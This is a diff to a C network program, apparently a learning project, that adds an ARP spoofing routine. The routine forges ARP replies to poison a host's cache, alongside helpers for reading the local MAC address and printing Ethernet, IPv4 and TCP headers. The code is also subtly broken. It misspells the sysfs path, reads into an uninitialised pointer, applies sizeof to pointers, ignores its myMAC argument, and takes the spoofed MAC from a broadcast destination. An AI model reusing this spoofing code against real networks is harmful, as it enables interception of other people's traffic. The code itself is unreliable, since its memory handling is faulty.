@@ -1,5 +1,7 @@
 #include <stdio.h>
 #include <stdint.h>
+#include <string.h>
+
 #include <netinet/if_ether.h> //for ETHERTYPE_IP and others
 #include <netinet/in.h> //for IPPROTO_TCP and others
 //#include <net/inet/arp.h> //for arp
@@ -37,7 +39,7 @@ struct Arp_header{
 	uint32_t senderIP;
 	uint8_t targetMAC[6];
 	uint32_t targetIP;
-}
+};
 
 struct Tcp_header{
 	uint16_t src_port;
@@ -53,39 +55,101 @@ struct Tcp_header{
 };
 
 
+static unsigned char ascii2byte(char *val);
 
-int arp_spoof(char* out_packet, char* in_packet)
+int getmyMAC(char* buf, char* dev);
+int arp_spoof(char* out_packet, char* in_packet,int sender, int target, char* myMAC);
+int check_arp_type(struct Arp_header *arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen );
+int analyze_packet( char* packet );
+int print_eth(struct Ethnet_header* eth);
+int print_Ip4(struct Ip4_header* iph);
+int print_Tcp(struct Tcp_header* tcph);
+int print_body( uint8_t* start, uint32_t len );
+
+
+
+static unsigned char ascii2byte(char *val)
+{
+    unsigned char temp = *val;
+
+    if(temp > 0x60) temp -= 39;  // convert chars a-f
+    temp -= 48;  // convert chars 0-9
+    temp *= 16;
+
+    temp += *(val+1);
+    if(*(val+1) > 0x60) temp -= 39;  // convert chars a-f
+    temp -= 48;  // convert chars 0-9   
+
+    return temp;
+
+}
+
+
+int getmyMAC(char* buf, char* dev){
+	char* macstring;
+	char filename[256];
+	char MAC[6];
+	FILE* pf;
+	int i;
+	sprintf(filename,"/sys/class/net/%s/adderss",dev);
+	if ( !( pf = fopen(filename,"r") ) ){
+		return -1;
+	}
+	if ( sizeof(buf) <6){
+		return -2;
+	}
+	fread(macstring,1,17,pf);
+	fclose(pf);
+		
+	for(i=0;i<6;i++){
+		buf[i] = ascii2byte(macstring+i*3);
+	}
+	return 1;
+}
+
+int arp_spoof(char* out_packet, char* in_packet, int sender, int target, char* myMAC)
 {
 	struct Ethnet_header* eth_hp;
 	struct Arp_header* arp_hp;
+	int _nsender = htonl(sender);
+	int _ntarget = htonl(target);
 
-	eth_hp = in_packet;
+	eth_hp = (struct Ethnet_header*) in_packet;
 	if( ntohs((*eth_hp).type) != ETHERTYPE_ARP ){
 		return -1;
 	}
-	arp_hp = in_packet+sizeof(struct Ethnet_header);
+	arp_hp = (struct Arp_header*)( in_packet+sizeof(struct Ethnet_header) );
 	if(!check_arp_type(arp_hp,1,0x0800,6,4)){
 		return -2;
 	}
 	if( (*arp_hp).op!=1 ){
 		return -3;
 	}
+
+	if( (*arp_hp).senderIP != _nsender ){
+		return -4;
+	}
+	if( (*arp_hp).targetIP != _ntarget ){
+		return -5;
+	}
+
 	memset(out_packet,0,sizeof(out_packet));
-	memcpy(out_packet,(*eth_hp).srcMac,6);
-	memcpy(out_packet+6,(*eth_hp).dstMac,6);
-	memcpy(out_packet+12,htons(ETHERTYPE_ARP),2);
+	memcpy(out_packet,(*eth_hp).srcMac,6); //dstMAC
+	memcpy(out_packet+6,(*eth_hp).dstMac,6); //srcMAC = myMAC
+	uint16_t ethtype_arp = htons(ETHERTYPE_ARP);
+	memcpy(out_packet+12,&ethtype_arp,2);
 	memcpy(out_packet+14,&((*arp_hp).htype),6); //copy original htype,ptype,hlen,plen
 	uint16_t ARPreply=htons(2);
 	memcpy(out_packet+20,&ARPreply,2); //op ARP reply
-	memcpy(out_packet+22,(*eth_hp).dstMac,6); //senderMAC = myMAC = org.eth.dstMAC
+	memcpy(out_packet+22,(*eth_hp).dstMac,6); //senderMAC = myMAC
 	memcpy(out_packet+28,&((*arp_hp).targetIP),4); //senderIP = org.targetIP
-	memcpy(out_packet+32,(*arp_hp).senderMac,6); //targetMAC = org.senderMAC
+	memcpy(out_packet+32,(*arp_hp).senderMAC,6); //targetMAC = org.senderMAC
 	memcpy(out_packet+38,&((*arp_hp).senderIP),4); //targetIP = org.senderIP
-	
+
 	return 1;
 }
 
-int check_arp_type(struct Arp_header* arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen ){
+int check_arp_type(struct Arp_header *arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen ){
 	return ( ntohs(arph->htype) == htype && ntohs(arph->ptype) == ptype 
 	&& arph->hlen == hlen && arph->plen == plen);
 }
@@ -103,15 +167,15 @@ int analyze_packet( char* packet )
 	char layer[512]="";
 
 
-	eth_hp = packet;
+	eth_hp = (struct Ethnet_header*) packet;
 	
 	if( ntohs(eth_hp->type) == ETHERTYPE_IP ){ //IPv4
 		strcat(layer,"/IPv4 ");
-		ip4_hp = packet + sizeof(*eth_hp);
+		ip4_hp = (struct Ip4_header*) (packet + sizeof(*eth_hp));
 		if( ip4_hp->protocol == IPPROTO_TCP ){
 			strcat(layer,"/TCP ");
 			printf("%s\n",layer);
-			tcp_hp = packet + sizeof(*eth_hp) + ((ip4_hp->ver_len)%16)*4;
+			tcp_hp = (struct Tcp_header*) (packet + sizeof(*eth_hp) + ((ip4_hp->ver_len)%16)*4);
 
 			print_eth(eth_hp);			
 			print_Ip4(ip4_hp);
@@ -122,7 +186,6 @@ int analyze_packet( char* packet )
 			print_body(data,data_size);
 		}
 	}
-	//printf("%x,%x,%x,%d,%x",packet,eth_hp,ip4_hp,((ip4_hp->ver_len)%16),tcp_hp);
 		
 	return 0;
 }
@@ -158,7 +221,8 @@ int print_Tcp(struct Tcp_header* tcph)
 	return 0;
 }
 
-int print_body( uint8_t* start, uint32_t len ){
+int print_body( uint8_t* start, uint32_t len )
+{
 	int i;
 	printf("data size(except header): %d\n",len);
 	for(i=0;i<len;i++){
